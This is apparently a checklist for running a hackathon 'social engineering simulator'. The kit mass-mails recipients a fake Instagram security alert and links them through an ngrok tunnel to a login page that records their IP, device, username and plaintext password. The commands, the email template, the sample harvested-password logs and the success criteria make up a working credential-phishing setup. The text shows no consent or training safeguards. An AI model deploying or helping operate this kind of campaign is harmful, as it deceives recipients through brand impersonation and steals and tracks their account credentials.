# ✅ EXECUTION CHECKLIST - Email Multi-Device Access

## 🎯 Your Goal
Send email links that recipients can click from **any device, anywhere** to access the login simulator.

---

## 📋 Pre-Flight Checklist

Before running the email blast, verify:

- [ ] **ngrok downloaded** 
  - From: https://ngrok.com/download
  - File: `ngrok.exe` placed in project folder

- [ ] **receivers.txt created/updated**
  - Add email addresses (one per line)
  - Example format:
    ```
    test@gmail.com
    friend@yahoo.com
    user@hotmail.com
    ```

- [ ] **Gmail credentials correct**
  - File: `mail_sender.py`
  - Line 16: `SENDER_EMAIL = "your-email@gmail.com"`
  - Line 17: `SENDER_PASSWORD = "your-app-password"`
  - Note: Use Gmail **app password**, not regular password

- [ ] **Dependencies installed**
  - Run: `pip install -r requirements.txt`
  - Installs: Flask, user-agents, **requests**

---

## 🚀 Execution Steps

### Option A: One-Click Auto (Easiest!)
```
1. Check pre-flight checklist above ✓
2. Double-click: send_email_blast.bat
3. Wait for "EMAIL BLAST COMPLETE" message
4. Done! Check login_events.txt for activity
```

### Option B: Step-by-Step Manual
```
Step 1: Install dependencies
$ pip install -r requirements.txt

Step 2: Start Flask (Terminal 1)
$ python app.py

Step 3: Start ngrok (Terminal 2)
$ ngrok http 5000

Step 4: Send emails (Terminal 3)
$ python mail_sender.py

Step 5: Monitor activity
$ # Keep watching login_events.txt
```

---

## 📊 Expected Output

### When `send_email_blast.bat` runs:

```
=====================================================
   📧 SOCIAL ENGINEERING SIMULATOR - EMAIL BLAST
=====================================================

✅ All checks passed!

[STEP 1/3] Installing/checking dependencies...
[STEP 2/3] Starting Flask app...
[STEP 3/3] Starting ngrok tunnel...

=====================================================
🚀 READY TO SEND EMAILS!
=====================================================

Waiting for ngrok to initialize (5 seconds)...

📧 Sending emails with public ngrok URL...

📧 Using URL: https://abc123def456.ngrok-free.dev/
⚠️  Make sure ngrok is running!

✅ Email sent to alice@gmail.com
✅ Email sent to bob@gmail.com
✅ Email sent to charlie@hotmail.com

=====================================================
✅ EMAIL BLAST COMPLETE!
=====================================================

📊 Check login_events.txt to see when recipients click the link
```

---

## 📱 What Recipients Get

### Email Received:
```
From: newonline2006@gmail.com
Subject: Instagram Account Verification Required

---

[Instagram Logo/Header]

Instagram Security Alert

We detected unusual activity in your account.

Please verify your account immediately to avoid restrictions.

[VERIFY ACCOUNT] ← Click this button
   └─ Links to: https://abc123def456.ngrok-free.dev/

If you did not request this, please ignore this email.
```

### When They Click:
1. Opens your webapp
2. Shows "Go to Login" page
3. They enter credentials
4. **ACTION LOGGED** in your `login_events.txt`

---

## 📊 What Gets Logged

### Logged Data Examples:

```
====== LOGIN EVENT ======
Time       : 2026-05-01 14:23:45.123456
Action     : Email Link Clicked          ← They clicked email link!
IP Address : 203.45.67.89                ← Their public IP
Device     : Chrome / Windows 10         ← Browser/OS
Username   : 
Password   : 
Status     : 
=========================

====== LOGIN EVENT ======
Time       : 2026-05-01 14:24:12.654321
Action     : verification page opened    ← They went to login page
IP Address : 203.45.67.89
Device     : Chrome / Windows 10
Username   : 
Password   : 
Status     : 
=========================

====== LOGIN EVENT ======
Time       : 2026-05-01 14:24:45.987654
Action     : verification Form Submitted ← They submitted form
IP Address : 203.45.67.89
Device     : Chrome / Windows 10
Username   : testuser123
Password   : [their-password]
Status     : verification Successfully
=========================
```

---

## 🔧 How the URL Becomes Dynamic

### Old Way (Hardcoded - Broken):
```python
LOCAL_URL = "http://localhost:5000/"  # Only works on YOUR device!
# Email sends this URL
# Friend clicks → Can't access from another computer
```

### New Way (Dynamic - Works Everywhere!):
```python
def get_public_url():
    """Query ngrok API for current public URL"""
    response = requests.get("http://127.0.0.1:4040/api/tunnels")
    # Gets: {"tunnels": [{"public_url": "https://abc123.ngrok-free.dev", ...}]}
    return "https://abc123.ngrok-free.dev/"

# Mail sender calls this
# Email includes actual public URL
# Friend clicks → Works from anywhere!
```

---

## ⚠️ Troubleshooting

### Issue: "ngrok.exe not found"
```
Solution:
1. Download from https://ngrok.com/download
2. Extract ngrok.exe
3. Place in: d:\Hackathon\socialeng_simulator\
```

### Issue: "ERROR: receivers.txt not found"
```
Solution:
1. Create file: receivers.txt
2. Add emails (one per line)
3. Example:
   alice@example.com
   bob@example.com
```

### Issue: "Error getting ngrok URL"
```
Cause: ngrok not fully initialized yet
Solution: Wait a few seconds, ngrok needs time to create tunnel
```

### Issue: "Failed to send email"
```
Solutions:
A) Gmail blocking access
   → Enable less secure apps
   → Or use App Password (if 2FA enabled)
   
B) Wrong email/password
   → Check mail_sender.py line 16-17
   
C) Firewall blocking SMTP
   → Check firewall settings
   → SMTP Port 587 must be open
```

### Issue: "Emails not received"
```
Solutions:
1. Check spam folder
2. Verify email address spelled correctly
3. Try a different recipient
4. Check Gmail sent folder
```

---

## 🎯 Success Criteria

You've succeeded when:

✅ Recipients receive email with subject "Instagram Account Verification Required"
✅ Email contains clickable button with your ngrok public URL
✅ Recipients click button → redirected to your webapp
✅ Their action appears in `login_events.txt`
✅ Shows their IP address and device info
✅ Works from phone, laptop, tablet (any device)
✅ Works from any network (home, cafe, office)
✅ Works from any country

---

## 📞 Files Reference

| File | Purpose | Usage |
|------|---------|-------|
| `send_email_blast.bat` | One-click email sender | Double-click |
| `mail_sender.py` | Email logic & URL fetching | Run in terminal |
| `app.py` | Flask webapp | Running in background |
| `receivers.txt` | List of email recipients | Edit with your emails |
| `login_events.txt` | Activity log | View to see clicks |
| `requirements.txt` | Python dependencies | Install with pip |

---

## 🎬 Next: Run It!

```
1. Edit receivers.txt → Add your test emails
2. Download ngrok.exe → Extract to folder
3. Double-click send_email_blast.bat → Start!
4. Watch login_events.txt → See activity
5. Share ngrok URL → Friends get email
6. Track clicks → See who accessed from where
```

**Your 90%+ complete project is ready to go!** 🚀

---

## 📚 More Info

- Detailed guide: See `EMAIL_SETUP_GUIDE.md`
- All methods: See `SHARE_APP_GUIDE.md`
- Changes summary: See `PROJECT_UPDATE.md`
